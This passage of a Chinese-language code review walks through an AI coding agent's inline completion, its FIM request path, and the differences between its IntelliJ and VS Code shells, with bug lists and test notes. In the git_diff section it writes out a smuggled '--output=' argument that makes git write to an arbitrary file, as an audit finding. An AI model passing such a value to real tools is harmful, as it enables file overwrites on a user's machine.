📌 **`clearTimeout` 在两条路径都调**：成功时清掉超时定时器，避免保持事件循环（VS Code 扩展宿主不会因为一个 1.5s 定时器退出，但这是好习惯）。

⚠️ **吞掉错误让「诊断」变得不可能**：Core 没启动、RPC 帧损坏、模型不存在——在 `inline.ts` 里全都是「没有补全」，日志里一个字节都没有。对比 `session.ts:84-87` 至少会把 stderr 打进 console。补全出问题时用户完全没有线索，只能去翻 Core 的 stderr。

### 9.15 与 Java 的端到端对照

| 环节 | TypeScript | Java |
|---|---|---|
| 注册 | `registerInlineCompletionItemProvider({pattern:"**"})` | `plugin.xml` 的 `inline.completion.provider`（`plugin.xml:113-116`），`order="first"` |
| 开关 | `agentCoder.inlineCompletion.enabled`（默认 `true`） | `ReportSettingsState.inlineCompletionEnabled`（L29） |
| 文件判定 | `scheme === "file"` | `isInLocalFileSystem && !isDirectory`（L34） |
| 大小判定 | `text.length`（UTF-16 码元） | `file.length`（字节）（L42） |
| 二进制判定 | `text.includes("\u0000")` | **无**（靠大小 + 用户自己关） |
| 取文本 | `getText()` 全文，再 `slice` | `getText(TextRange)` 只要两段（L48-55） |
| 防抖 | 自己在 provider 里 `sleep(300, token)` | 框架 `DebouncedInlineCompletionProvider`（L37） |
| 超时 | `withTimeout(1500)` | `Future.get(1500ms)`（`InlineCompletionClient.java:41-42`） |
| 超时后 | 放弃等待，Core 继续算 | 放弃等待，Core 继续算 |
| 线程 | 扩展宿主事件循环 | `Dispatchers.IO`（L57） |
| 结果解析 | `response.result?.text` | `result.has("text") ? result.get("text").getAsString() : ""` |
| 缩进处理 | 原样插入（可能错位） | `InlineCompletionTextElement` 交给平台 |
| 语言 id | `document.languageId` → 被 Core 忽略 | `file.extension` → 被 Core 忽略 |

📌 **两边都「宁可没有补全也不能报错」**：TS 的四重 `return undefined` + Java 的 `runCatching{}.getOrNull()`（L58-62）+ Core 的 `except Exception: return {"text": ""}`（`server.py:390-392`）—— 三层都在吞异常。这是补全功能的正确姿势：**编辑器里的任何辅助提示都不该比「没有提示」更糟**。

### 9.16 串起 Core：`completion.py` 的一次 FIM 请求

壳只负责「切前后文」，真正的补全在 Core。把链路补完：

```python
# server.py:374-392
374  async def _run_inline(self, req_id, params) -> None:
376      try:
377          text = await asyncio.wait_for(
378              complete_inline(
379                  self.config,
380                  str(params.get("prefix") or ""),
381                  str(params.get("suffix") or ""),
382                  str(params.get("language") or ""),
383                  int(params.get("maxTokens") or 128),
384              ),
385              timeout=12.0,
386          )
387          self._send(make_response(req_id, {"text": text}))
388      except asyncio.TimeoutError:
389          self._send(make_response(req_id, {"text": ""}))
390      except Exception:
392          self._send(make_response(req_id, {"text": ""}))
```

📌 **`maxTokens` 壳从不传**：TS（`inline.ts:67-72`）和 Java（`InlineCompletionClient.java:35-39`）都没这个字段 → 永远是 `128`。`completion.py:74` 又做了 `max(16, int(max_tokens))`，`completion.py:100` 同样。所以一次补全最多 128 个 token（约 2-4 行）。

📌 **12 秒兜底在 CI 之外**：`asyncio.wait_for` 12s 是最后一层；`httpx` 自己的 `read=8.0` 更早触发。三层超时（壳 1.5s / httpx 8s / asyncio 12s）构成「越靠内层越宽松」的漏斗。

然后是真正的 HTTP：

```python
# completion.py:43-59
43  async def complete(config, prefix, suffix="", language="", max_tokens=128) -> str:
46      prefix = (prefix or "")[-MAX_PREFIX_CHARS:]
47      suffix = (suffix or "")[:MAX_SUFFIX_CHARS]
48      if not prefix.strip():
49          return ""
50      try:
51          if (config.provider or "").lower() == "openai_compat":
52              text = await _complete_openai(config, prefix, suffix, max_tokens)
53          else:
54              text = await _complete_ollama(config, prefix, suffix, max_tokens)
55      except (httpx.HTTPError, ValueError, KeyError, TypeError) as exc:
57          LOGGER.debug("inline completion failed: %s", exc)
58          return ""
59      return sanitize(text, prefix, suffix)
```

📌 **`provider` 只分两类**（51 行）：`openai_compat` 走 `/completions`，**其余全部走 Ollama 的 `/api/generate`**。注意这里和 `detect_provider` 的三分类（`ollama` / `openai_compat` / 其它）不同——FIM 只认这两种协议。

📌 **`sanitize()` 是补全质量的最后一道关**（59 行，实现 118-142）：

| 步骤 | 行 | 作用 |
|---|---|---|
| 规范化换行 | 122 | `\r\n` → `\n` |
| 去代码围栏 | 123、145-148 | 丢掉所有以 ` ``` ` 开头的行——模型爱把补全包进围栏 |
| 截断「重复后续代码」 | 125-132 | 在 `suffix` 里找长度 ≥4 的非空行，若补全里也出现，就在那里截断 |
| 去尾部空白 | 133 | `rstrip()` |
| 去「回显前缀尾行」 | 137-139 | 若补全以 `prefix` 最后一行的内容开头（长度 ≥8），说明模型在复读上文，切掉 |
| 去重复换行 | 140-141 | `prefix` 以 `\n` 结尾时，补全开头的 `\n` 删掉 |
| 空白即空 | 142 | `text.strip()` 为空返回 `""` |

📌 **`stop: ["\n\n"]`**（`completion.py:75`、`102`）：模型遇到连续空行就停，最多返回一个「块」（一个函数体 / 一段 if）。这是 FIM 补全的通用技巧——不设这个 stop，模型会一路续写到 token 上限。

📌 **两家 API 的参数形状**：

| | Ollama `/api/generate` | OpenAI `/completions` |
|---|---|---|
| 前缀字段 | `prompt` | `prompt` |
| 后缀字段 | `suffix` | `suffix` |
| token 上限 | `options.num_predict` | `max_tokens` |
| 温度 | `options.temperature = 0.1` | `temperature = 0.1` |
| stop | `options.stop = ["\n\n"]` | `stop = ["\n\n"]` |
| 取结果 | `data["response"]` | `data["choices"][0]["text"]` |

📌 **温度写死 0.1**：补全要的是「确定性最强的下一个 token」，不能像聊天那样 0.2 或更高。

⚠️ **`_complete_openai` 对不支持 FIM 的云端模型会静默返回空**（106-110）：OpenAI 的 `/v1/completions` 已被官方标记 deprecated，很多新模型直接 404。注释也写了「Many cloud models have no /completions endpoint at all」。所以「用 GPT-4o 配行内补全」的结果是**永远没有补全**，且没有任何提示——用户只会觉得「这功能坏了」。

### 9.17 小结：一条补全的完整时序

```
按键
 │
 ├─ VS Code 调 provideInlineCompletionItems(token)
 │     ├─ 开关关？               → undefined
 │     ├─ 非 file scheme？       → undefined
 │     ├─ getText() → 全文字符串
 │     ├─ 太长 / 含 \0？         → undefined
 │     └─ 无 connection？        → undefined
 │
 ├─ Automatic？→ sleep(300, token)   ← 期间再按键 → token 取消 → undefined
 │
 ├─ request("inline/complete", {prefix,suffix,language,path})   ← 登记 pending
 ├─ withTimeout(1500ms)             ← 超时 → undefined（Core 继续算）
 │
 │   ┌──── Core ────────────────────────────────────────────┐
 │   │ create_task(_run_inline)                            │
 │   │ wait_for(complete(...), 12s)                        │
 │   │   complete() → 裁前后文 → 8s httpx                  │
 │   │     ├─ ollama: POST /api/generate {prompt,suffix}   │
 │   │     └─ openai: POST /completions {prompt,suffix}    │
 │   │   → sanitize(): 去围栏 / 截重复 / 去回显            │
 │   │ → make_response({text})\n│                           │
 │   └─────────────────────────────────────────────────────┘
 │
 ├─ token 取消？→ undefined
 ├─ text 非字符串 / 空？→ undefined
 └─ [new InlineCompletionItem(text, Range(pos, pos))]  → 灰色 ghost text
```

📌 **一次补全最多产生 5 个 `undefined` 出口**，全部静默。设计意图写在 `inline.ts:20-22` 的注释里：

```ts
20  // Never throws and never shows UI: any failure (no Core, timeout, empty answer)
21  // simply means "no suggestion", so typing stays responsive.
22  // 不报错也不弹窗：无 Core、超时或空结果一律视为“没有补全”。
```

---

## 10. 双壳对照：同一份协议，两套实现

前八卷只看了 IntelliJ 壳，§1–§9 只看了 VS Code 壳。这一节把两者**并排**——因为差异本身回答了一个关键问题：

> 协议里哪些字段是**必需的**，哪些是**某个壳自愿提供的**？

### 10.1 先把职责分开：Core 保证的 vs 壳自愿的

| 能力 | 归属 | 依据 |
|---|---|---|
| LLM 调用 / 流式 / 工具循环 | **Core** | 05 卷 |
| 权限计算（`auto` / `ask` / `deny`） | **Core** | `permissions.py`；壳收到的只是结论（`tool/invoke` 的 `permission`） |
| 工具**实现** | **壳** | Core 注册 `remote` 工具，发 `tool/invoke` 等壳回 `tool/result` |
| 会话持久化 / 历史检索 | **Core** | `session-store` / `session-search`（07 卷） |
| 记忆 / 索引 / MCP / Skills / 子代理 | **Core** | 07 卷 |
| 文件编码判定 | **壳** | Core 收不到字节，只有壳知道原文件是什么编码 |
| Markdown 渲染 | **壳** | Core 只发纯文本 `chat/token` |
| diff 确认 UI | **壳** | Core 只发 `permission: ask` |
| `ask_user` | **Core 发起，壳声明能力** | 壳在 `ide/hello` 里写 `capabilities: ["ask-user", …]` |
| 思考过程展示 | **Core 发 `chat/reasoning`，壳决定怎么画** | IntelliJ 折成一行「思考过程 · 12.4s · 3204 字」；VS Code 忽略该通知 |
| 团队预审 | **Core 发起，壳声明能力** | 壳在 `ide/hello` 里写 `capabilities: ["team"]` |
| 写操作串行化 | **壳自愿** | 只有 Java 有 `ProjectWriteGate` |
| 多标签会话 | **壳自愿** | 只有 Java 有 `SessionTabsBar` |
| 行内补全 | **Core 提供 `inline/complete`，壳提供编辑器集成** | 05 卷 + §9 |

📌 **表格里「壳自愿」的两行是唯一的真差异**：Core 从来没要求壳支持多会话或写锁。Java 做了，是因为它把「一个项目里同时看三个任务」当成了产品需求；VS Code 没做，是因为它把「一个面板一个任务」当成了够用。

### 10.2 主对照表

| # | 维度 | IntelliJ（Java/Kotlin） | VS Code（TypeScript） | 性质 |
|---:|---|---|---|---|
| 1 | 激活方式 | `plugin.xml` 声明式，平台调工厂 | `package.json` 的 `activationEvents` + `activate()` | 框架差异 |
| 2 | 进程启动 | `AgentCoreService.connection()`，`synchronized` + 惰性 | `CoreSession.ensureStarted()`，`await keyReady` 后惰性 | 同构 |
| 3 | 服务发现 | `PythonLocator`：`--version` **真探测**（`PythonLocator.java:26-40`） | `locatePython()` 只查路径，**不探测**（`locator.ts:30-40`） | **差异** |
| 4 | `projectId` | `Project.getLocationHash()`（`AgentCoreService.java:50-52`） | `sha1(projectRoot).slice(0,12)`（`session.ts:32`） | **不同源** |
| 5 | `dataDir` | `~/.agent/data/<locationHash>`（L55） | `~/.agent/data/<sha1-12>`（`session.ts:84`） | **不同目录** |
| 6 | 首会话 id | 无（**全部**带 `#uuid`） | `projectId`（**裸的**，`session.ts:33`） | **差异** |
| 7 | 新会话 id | `locationHash + "#" + UUID 前 8 位`（`AgentChatPanel.java:170-171`） | `projectId + "#" + Date.now().toString(36)`（`session.ts:225`） | 同形不同源 |
| 8 | 多标签 | 有，`MAX_SESSIONS` 上限，号位回收（L161-240） | 无，一个面板一个会话 | **能力差** |
| 9 | `ide/hello` | `{protocolVersion:"1.0", ide:"intellij", capabilities:["ask-user","team"]}`（L187） | `{protocolVersion:"1.0", ide:"vscode", capabilities:["ask-user","team"]}`（`session.ts:107-111`） | 一致 |
| 10 | 设置下发 | 14 键，`ModelProfile` + `ReportSettingsState`（L126-160） | 14 键，`agentCoder.*`（`settings.ts:26-66`） | 同构 |
| 11 | `embedding_model` 默认 | 有值（`ReportSettingsState.java:59`，页面回填 L257-258） | **`""`**（`settings.ts:36`） | **bug** |
| 12 | API Key 存储 | `PasswordSafe` | `SecretStorage` + 明文迁移 + env 兜底（`secrets.ts`） | 同构 |
| 13 | 工具清单 | 11 个（`ToolDispatcher.java:100-121`） | 11 个（`tools.ts`），名字逐个相同 | 一致 |
| 14 | 写操作锁 | `ProjectWriteGate`（公平锁 + 排队提示） | 无 | **能力差** |
| 15 | 权限弹窗 | `needsApproval` → `DiffConfirmCard` / `confirm` | `confirmEdit` / `confirmAction` | 同构 |
| 16 | `autoAcceptEdits` | 只免写文件，命令照旧要批（L67-69） | 只免写文件，命令照旧要批（`tools.ts:395`） | 一致 |
| 17 | 文件编码 | `FileText.read/write` 保编码 + BOM | 一律 UTF-8 | **能力差** |
| 18 | diff 展示 | 自绘 `JBTextArea`（`DiffConfirmCard.java:55-107`） | 原生 diff 编辑器 + 临时文件（`diff.ts`） | 取舍 |
| 19 | Markdown | `MarkdownRenderer` + `MarkdownParser`（08 卷） | 纯文本 `textContent`（`panel.ts`） | **能力差** |
| 20 | 工具线程 | `executeOnPooledThread`（`ToolDispatcher.java:71`） | 扩展宿主事件循环（`tools.ts` 全同步 IO） | **风险差** |
| 21 | 超时 | 各工具自带 `Future.get` | `withTimeout` / `AbortController` | 同构 |
| 22 | 行内补全 | Kotlin Provider + 平台缩进处理 | 自写 provider，缩进可能错位（§9.12） | 取舍 |
| 23 | 思考过程 | `chat/reasoning` → 折叠行「思考过程 · 12.4s · N 字」 | **忽略 `chat/reasoning`**（无思考展示） | **能力差** |
| 24 | 工具进度文案 | 英文日志行 `read_file · src/… · done · 0.4s` | `[工具] read_file 执行中...`（中文+无参数） | 差异 |

### 10.3 第 4/5 行：两个壳读写的是两套数据

这是全表里影响最大的一条。把两边的路径展开：

```
IntelliJ：  ~/.agent/data/<locationHash>/        ← 会话、记忆、索引、usage
VS Code ：  ~/.agent/data/<sha1(projectRoot)[0:12]>/  ← 完全是另一个目录
```

`sha1("D:\\learn\\myrepo")` 的前 12 位是固定的 48 bit 十六进制；`getLocationHash()` 是平台给项目算的短哈希（默认实现基于项目路径，但**算法与 SHA-1 无关、长度也可能不同**）。两者**不可能碰巧相等**。

后果：

| 行为 | 结果 |
|---|---|
| 在 IntelliJ 里聊了 10 轮，切到 VS Code | **历史列表是空的** |
| 在 VS Code 里让模型记住「这个项目用 Maven」 | IntelliJ 侧读不到这条记忆 |
| 语义索引 | 两边各建一份，各花一次 embedding 的费用 |
| `usage` 统计 | 两边各记各的，日报里的 token 数对不上 |

📌 **这不是 bug，是设计缺口**：`--project-id` 是协议字段，Core 不关心它怎么算。但两个壳各自实现时都选了「本地最短的方式」，于是数据分叉。要修必须**两边改成同一个算法**（例如都用 `sha1(realpath)` 前 12 位），而且老数据需要迁移。

⚠️ **同一仓库在 VS Code 里开两个窗口（不同子目录）也算两个项目**：`workspaceFolders[0].uri.fsPath` 取的是**第一个工作区根**，多根工作区永远只认第一个（`session.ts:31`）。

### 10.4 第 6 行：TS 的首会话 id 是「裸」 projectId

```ts
// session.ts:32-33
32    this.projectId = createHash("sha1").update(this.projectRoot).digest("hex").slice(0, 12);
33    this.sessionId = this.projectId;
```

```java
// AgentChatPanel.java:170-171
170        String sessionId = coreService.sessionId() + "#"
171                + UUID.randomUUID().toString().substring(0, 8);
```

差异：

| | Java | TS |
|---|---|---|
| 是否存在「默认会话」 | **不存在**，每个标签都新建一个 id | 存在，就是 `projectId` 本身 |
| 会话 id 形态 | 恒为 `<hash>#<8 hex>` | 首个为 `<hash>`，之后为 `<hash>#<base36>` |
| 重启 IDE 后 | 新标签新 id（旧会话去历史里找） | **回到 `projectId`** → 接着写入同一份会话文件 |

📌 **TS 的行为其实更像「工作区默认会话」**：关了再开，`sessionId` 又变回 `projectId`，Core 会把这次对话**追加到**上次那份额外的会话文件里。用户视角是「上次聊的还在」，但历史列表里只有**一条**贯穿始终的记录，没有「每次开新话题」的区分。Java 则相反：每次开面板都是空白，想继续得去历史里点。

📌 **两边的 `#` 后缀算法不同**（UUID vs 时间戳 base36），但因为 id 是 Core 的**不透明字符串**，只要在同一 `projectId` 下唯一就行——Core 不解析 `#` 后面的内容。

### 10.5 第 13 行：11 个工具逐个对照

名字**完全一致**，这是协议层的要求（Core 的工具注册表按名字分发）。差异全在实现：

| 工具 | Java | TS | 关键差异 |
|---|---|---|---|
| `read_file` | `FileTools.readFile` | `tools.ts` `readFile` | 行号都是 `N→`；Java 按**字节**判 512 KB 并解码（GBK 可读），TS 按 UTF-8 读 |
| `list_dir` | `FileTools.listDir` | `listDir` | 都静默截断到 300 条；Java 目录加 `/` |
| `search_code` | `SearchTools.searchCode` | `searchCode` | 见 8.9 的表：点目录、扩展名黑名单、编码、大小全不同 |
| `git_log` | `GitTools.log` → `GitLogCollectorService` | `gitLog` | 都 `end+1 天`；Java 用 `LocalDate.parse`（错误可读），TS 用 `new Date`（`Invalid time value`） |
| `git_diff` | `GitTools.diff` | `gitDiff` | **Java 没有 `--` 分隔符**（`GitTools.java:51-53`），TS 有（`tools.ts:300`） |
| `write_file` | `EditTools.writeFile` | `writeFile` | Java 保编码/BOM；TS 一律 UTF-8 |
| `edit_file` | `EditTools.editFile` | `editFile` | 同上；错误文案逐字一致 |
| `delete_file` | `EditTools.deleteFile` | `deleteFile` | 都先读全文做快照 |
| `revert_file` | `EditTools.revertFile` | `revertFile` | 单层快照，两端一致 |
| `run_command` | `CommandTools.runCommand` | `runCommand` | Java 用 `ProcessBuilder` + `destroyForcibly`；TS 用 `chcp 65001` + `AbortController` |
| `diagnostics` | `DiagnosticsTools.diagnostics` | `diagnostics` | 都是「只对已打开文件」；Java 必须 `invokeAndWait` 进 EDT |

⚠️ **`git_diff` 的参数注入风险只在 Java 侧**：

```java
// GitTools.java:50-53
50        GitLineHandler handler = new GitLineHandler(project, repository.getRoot(), GitCommand.DIFF);
51        if (args.has("path")) {
52            handler.addParameters(args.get("path").getAsString());
53        }
```

模型（或提示注入）传 `{"path": "--output=C:\\\\temp\\\\pwn.txt"}`，git 会把 diff 写进任意文件。TS 的 `["diff", "--", path]`（`tools.ts:300`）用 `--` 明确「后面全是路径」，**这个保护 Java 侧缺失**。

📌 **`git_log` 的日期语义两端一致**：Java 的 `GitLogCollectorService.java:64` 有 `queryEnd = endDate.plusDays(1)`，注释写着「不包含 endDate+1 当天」；TS 的 `session.ts`/`tools.ts:275-277` 算的是同一个东西。

### 10.6 第 14 行：写锁只在 Java

Java 的 `ProjectWriteGate`（`ToolDispatcher.java:27`、`72-79`、`86-90`）：

```java
72            if (writeOp) {
73                String waitedFor = writeGate.acquire(label);
74                if (waitedFor != null && notice != null) {
75                    // Same English-log style as the rest of the tool timeline.
76                    // 与工具时间线其余部分一致：按英文日志风格写。
77                    notice.accept("queued · waiting for session " + waitedFor + " · " + toolName);
78                }
79            }
```

三重作用：
1. **互斥**：多个标签页的写操作串行。
2. **提示**：排队时把「在等谁」写回对话区。
3. **跨进程**：`ProjectWriteGate` 是项目级 service，同一项目的两个窗口共享（08 卷 §13.2）。

TS 侧连「一个进程内的锁」都没有（`tools.ts` 直接 `fs.writeFile`）。因为只有一个会话，日常不会撞；但**两个 VS Code 窗口打开同一仓库**时，两个扩展宿主是两个独立进程，没有 `ProjectWriteGate` 这种东西——这是**架构层面的缺口**，不是改几行能补的（要么用文件锁，要么把写操作收归 Core）。

### 10.7 第 9 行：`capabilities` 两边都声明了，但一边没实现

```ts
// session.ts:107-111
107    connection.notify("ide/hello", {
108      protocolVersion: "1.0",
109      ide: "vscode",
110      capabilities: ["ask-user", "team"],
111    });
```

Core 只在 `_handle_notification` 里把集合存下来（`server.py:444-451`），之后两处判定：

```python
# server.py:856-859（_ask_via_shell）
856    async def _ask_via_shell(self, questions: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
857        if "ask-user" not in self._shell_capabilities:
858            LOGGER.info("ask_user skipped: shell did not advertise ask-user")
859            return None
```

- **`team` 用上了**：`agent/confirm` 的 `kind: "preapprove"` 分支会画预审卡（`session.ts:506-510`）。
- **`ask-user` 没用上**：`onNotification` 没有 `ask/user` 分支，提问卡永远不会出现；Core 会一直等到 `ASK_TIMEOUT`（`server.py:63`，1800 s）才按「跳过」收场。

📌 **两边声明一致，但只有 IntelliJ 真的实现了提问卡**。早期 VS Code 是「不声明也不实现”，那时 Core 会立刻回退；现在声明了却没有 UI，反而把一次提问变成了 30 分钟的空等。

### 10.8 第 17 行：编码——不是「少一个功能」，是「会损坏文件」

| 场景 | Java | TS |
|---|---|---|
| 读 GBK 文件（`read_file`） | `FileText.read` 探测 → 正确解码，附「文件编码 GBK」提示 | `fs.readFile("utf-8")` → `�` |
| 搜 GBK 文件（`search_code`） | `FileText.read` → 能搜到中文 | `fs.readFile("utf-8")` → 搜不到，且可能匹配到乱码 |
| 写 GBK 文件（`edit_file`） | `FileText.write(path, newContent, previous)` → **保持 GBK + BOM** | 以 UTF-8 覆写 → **原文件永久变成乱码** |
| 带 BOM 的 UTF-8 | 保留 BOM | 丢掉 BOM |
| CRLF 文件 | `splitLines` 保留行尾信息，写回时可保持 | `readFile` 后 `\r\n` 变 `\r\n`，`edit_file` 的 `old_string` 通常写成 `\n` → **匹配失败** |

⚠️ **「CRLF 文件 `edit_file` 必失败」是两端共有的**（`tools.ts:333` 与 `EditTools` 的 `indexOf` 同样按字面匹配），但 TS 读进来的是原始 `\r\n`，Java 的 `FileText.splitLines` 之后再拼回来时行为不同——这是**最容易把模型卡在「找不到 old_string」循环里**的坑：模型从 `read_file` 看到的是去掉 `\r` 的行，于是构造 `old_string` 时用 `\n`，而文件里是 `\r\n`。

### 10.9 第 19 行：Markdown 渲染

| | Java | TS |
|---|---|---|
| 渲染器 | `MarkdownRenderer`（自行解析，08 卷）+ `markdown/MarkdownParser` | **没有**，`textContent` 纯文本 |
| 代码块 | 等宽 + 背景 + 复制按钮 | 原样显示 ` ``` ` 围栏 |
| 表格 / 列表 | 有 | 无 |
| `**粗体**` | 有 | 原样显示 `**` |
| 搜索片段 `<mark>` | `highlightSnippet` 转 `<b>`（`AgentChatPanel.java:320-340`） | `snippetNode` 只解析 `<mark>`（`panel.ts`） |
| 安全性 | `escapeHtml` 手动转义 | `textContent` 天然安全 |

📌 **两边的取舍方向相反**：Java 自绘渲染器（好看，但有 XSS/转义风险，所以要手写 `escapeHtml`）；TS 用 `textContent`（绝对安全，但**模型输出的 Markdown 全是裸文本**）。对一个「读懂模型回答」的场景，TS 的体验明显更差——这也是 §0.1 里说的「把渲染外包给 Webview 的一坨 HTML 字符串」的代价：省了 2 万行代码，也省掉了渲染能力。

### 10.10 第 20 行：线程模型

| | Java | TS |
|---|---|---|
| 工具执行 | `executeOnPooledThread`（`ToolDispatcher.java:71`） | 扩展宿主**事件循环**（`onToolInvoke` 是 `async`，但内部全是同步 `fs`） |
| 一个 500 ms 的 `fs.readFile` | 占用一个池线程 | **阻塞整个扩展宿主**（含 RPC 读循环、UI 响应） |
| 灾难性正则 | `java.util.regex` 有回溯限制 | JS `RegExp` 无限制 → 卡死编辑器 |
| `diagnostics` | 必须 `invokeAndWait` + `runReadAction` | `getDiagnostics()` 任意线程 |

⚠️ **`tools.ts` 用 `fs.promises` 还是 `fs` 同步版**：文件头 `import * as fs from "fs"` + `await fs.readFile(...)`（`tools.ts:243`、`313`）→ 用的是 `fs.promises` 的 promise 形式（TypeScript 的 `fs` 模块同时导出两者，`await` 作用在回调 API 上会得到 `undefined`，但这里显式用了 3 个参数的 Promise 版本）。**不过 `fs.statSync` / `execSync` 这类同步调用若存在，会真的卡住宿主**——`tools.ts` 里没有同步调用，全部是 `await`。所以这里是「风险」而非「已发生的问题」。

### 10.11 差异清单：哪些是 bug，哪些是取舍

**真 bug（应修）**

| # | 问题 | 位置 | 后果 |
|---:|---|---|---|
| 1 | 声明了 `ask-user` 但没实现 `ask/user` 卡 | `session.ts:110` + `onNotification` | 提问任务卡到 1800 s 超时 |
| 2 | `embedding_model: ""` | `settings.ts:36` | 语义索引抛「未配置 Embedding 模型」 |
| 3 | `projectId` 算法不同 | `session.ts:32` vs `AgentCoreService.java:51` | 两端数据/记忆/索引完全不共享 |
| 4 | `git_diff` 缺 `--` | `GitTools.java:51-53` | 参数注入（可写任意文件） |
| 5 | `source === "correction"` | `panel.ts:502` | 记忆来源永远标「偏好」 |
| 6 | 历史重放出空气泡 | `panel.ts:672-677` | 每条用户消息后多一个空「助手：」 |
| 7 | `deny` 被降级为「问一下」 | `tools.ts:395` | 壳层缺一道独立防线（Core 目前不发 `deny`，故未触发） |
| 8 | `persist` 先写盘再 save | `tools.ts:154-156` | 可能丢掉代理刚做的修改 |
| 9 | spawn 未监听 `'error'` | `rpc.ts:62-75` | Python 不存在时变成未捕获异常 |

**能力差（有意的取舍）**

| # | 缺什么 | 影响 |
|---:|---|---|
| 1 | 多标签会话 | 不能并行看两个任务 |
| 2 | 写锁 | 多窗口同时写同一仓库会冲 |
| 3 | Markdown 渲染 | 回答全是裸文本 |
| 4 | 编码保持 | GBK 文件被烧 |
| 5 | 文件时间戳/编码探测 | 读日志常乱码 |

**已对齐（别以为是 bug）**

- 11 个工具名、参数名、错误文案（`未找到 old_string...`）逐字一致。
- `autoAcceptEdits` 只免写文件、命令照旧要批。
- `git_log` 的 `end+1 天`、`--date=short`。
- `chat/cancel` 传 `{}` = 取消全部任务（`session.ts:142`）。
- 单层文件快照。
- 超时当「成功 + 提示」返回，不是失败。

### 10.12 如果要写第三个壳：协议最小实现清单

把两个壳的共同点抽出来，就是「一个能用的壳」的最小集合：

**必需（少了就不工作）**

1. 拉起进程：`--project-id <str> --data-dir <path>`，环境 `PYTHONIOENCODING=utf-8`、`PYTHONPATH=<core>/src`（`rpc.ts:40-58`）。
2. 行协议：一行一个 JSON，`{id,method,params}` 请求 / `{method,params}` 通知 / `{id,ok,result|error}` 响应。
3. `ide/hello`（可省，但省了 `ask_user` 就不可用）。
4. `settings/update`：至少 `provider` / `base_url` / `model`（`settings.ts:30-43`）。
5. `chat/start` → 接 `chat/token` / `chat/toolStart` / `chat/toolEnd` / `chat/finish` / `chat/error`。
6. `tool/invoke` → 执行 → `tool/result`（`{toolCallId, ok, result, error}`）。
7. `agent/confirm` → `agent/confirmResult`（`{confirmId, approved}`）。

**强烈建议（体验会好很多）**

8. `chat/cancel`（否则「停止」按钮就是摆设）。
9. `chat/todos` + `chat/notice`（进度可见）。
10. `session/list` / `session/get`（历史）。
11. 编码保持（否则写文件是破坏性的）。

**可以不做**

12. `inline/complete`（补全，独立功能）。
13. `memory/*` / `index/*`（走 Core，没有 UI 也能用）。
14. `ask/user`（不声明 `capabilities` 即可）。

---

## 11. `core/tests`：26 个测试文件（+1 个辅助夹具）、298 个测试

前八卷每讲一条不变量，都写着「这里有个坑，错了会怎样」。这一节把它们**兑现成断言**：每个测试文件守的是哪条线。

### 11.1 先搞清怎么跑

这里有个容易误判的地方：**测试是 `unittest` 写的，不是 pytest 风格**。

```python
# test_scheduler.py:1-20
 1  """Tests for the parallel tool scheduler."""
 3  import asyncio
 7  import unittest
 9  sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
11  from agent_core.agent.scheduler import ToolScheduler
20  class TestScheduler(unittest.IsolatedAsyncioTestCase):
```

三个特征：

| 特征 | 位置 | 含义 |
|---|---|---|
| `sys.path.insert(0, ../src)` | 每个文件头部 | **不需要 `pip install -e core`**，直接跑就行 |
| `unittest.TestCase` / `IsolatedAsyncioTestCase` | 每个 class | 无 fixture、无 parametrize、无 `conftest.py` |
| `if __name__ == "__main__": unittest.main()` | 每个文件末尾 | 单文件也能直接 `python tests/test_x.py` |

运行方式：

```bash
cd core
python -m unittest discover -s tests -v      # 全部
python -m unittest tests.test_ask -v         # 单文件
python tests/test_ask.py                     # 也能跑
```

📌 **为什么用 `unittest`**：Core 的运行依赖只有 `pydantic` + `httpx`（`core/pyproject.toml:6-9`），`pytest` 只在 `dev` 可选依赖里（L11-15），而且 `pyproject.toml` **没有任何 `[tool.pytest.ini_options]`**。用 `unittest` 意味着：装完 Core 就能测，不需要额外环境；代价是没有 pytest 的参数化与 fixture 复用——所以你会看到大量 `for command in (...): self.assertEqual(...)` 的手写循环（如 `test_commands.py:9-19`）。

⚠️ **异步测试靠 `IsolatedAsyncioTestCase`（Python 3.8+）**：它给每个 `async def test_` 单独建一个事件循环。这和 pytest-asyncio 的 `asyncio_mode` 无关——就算你用 pytest 跑，这些用例也是由 unittest 驱动的。所以 `pyproject.toml` 里的 `pytest-asyncio` 其实**没被用到**（没有任何 `@pytest.mark.asyncio`）。

### 11.2 总表：谁守哪条线

| 文件 | 行 | 测试 | class 结构 | 锁住的不变量 | 实现位置 |
|---|---:|---:|---|---|---|
| `test_llm_providers.py` | 329 | 18 | Detection / ChatUrls / ToolUnsupported / OpenAIFallback / OllamaFallback / ReasoningStream | 端点形状优先、不支持 tools 时降级并只提示一次、思考字段走独立通道 | 05 卷 |
| `test_transport_errors.py` | 195 | 12 | DescribeError / SurfaceErrors / Retries / ServerErrorText | 错误能定位「哪个阶段、哪个端点」，503 重试有边界 | 05 卷 |
| `test_streaming.py` | 117 | 11 | ParseSseLine / OpenAIAcc / OllamaAcc | 工具调用分片合并、并行两槽、usage 提取、思考与正文分家 | 05 卷 |
| `test_tool_text.py` | 149 | 10 | Filter / Recover / ProviderRecovers | 文本形式的工具调用被识别并隐藏 | 05 卷 |
| `test_completion.py` | 59 | 7 | CompletionUrls / Sanitize | FIM 的 URL 拼接与结果清洗 | 05 卷、§9.16 |
| `test_context.py` | 135 | 9 | TrimHistory / BudgetFor | 裁剪不制造孤儿 tool 消息、不动最新用户轮 | 05 卷 |
| `test_scheduler.py` | 91 | 4 | Scheduler | 并行、超时隔离、回调时序 | 04 卷 |
| `test_status.py` | 151 | 8 | TurnStats / LoopInjection | 「重复调用」提醒只在后续轮出现 | 04 卷 |
| `test_unknown_tool.py` | 96 | 4 | UnknownToolError / Fuse | 未知工具名报出可用名，重复出错就停 | 04 卷 |
| `test_subagent.py` | 364 | 21 | Loader / Pool / Service / CatalogInjection | 子代理白名单、并行、超时降级为报告 | 04 卷 |
| `test_ask.py` | 174 | 17 | Normalize / Render / Handler / InteractiveScheduling | 提问数据结构、无 UI 降级、独占调度 | 06 卷 |
| `test_team.py` | 374 | 28 | Parsing / CapabilityMatrix / Loader / ServicePrompt / Dispatch / Preapprove / BlackboardTools | 团队名册解析、能力档裁剪、派发与轮次上限、预审只豁免声明范围 | 03/04 卷 |
| `test_blackboard.py` | 111 | 8 | Artifacts / SessionPersistence | 交付物字段归一化、超限丢最旧、随会话落盘 | 03 卷 |
| `test_commands.py` | 68 | 7 | Decide | 白名单 / 确认 / 硬拒绝三分类 | 06 卷 |
